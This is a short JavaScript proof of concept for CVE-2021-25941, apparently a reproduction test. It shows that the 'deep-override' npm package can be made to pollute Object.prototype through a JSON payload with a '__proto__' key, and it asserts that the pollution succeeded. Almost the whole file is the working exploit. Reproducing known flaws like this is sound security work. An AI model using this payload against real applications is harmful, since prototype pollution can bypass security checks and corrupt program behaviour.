//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25941

const assert = require('assert');
var deepOverride = require("deep-override")
var obj = {}
console.log("Before : " + obj.polluted); 
deepOverride(obj, JSON.parse('{ "__proto__": { "polluted": "yes" }}')); 

console.log("After : " + {}.polluted);
assert({}.polluted === "yes")
console.log("payload success!")
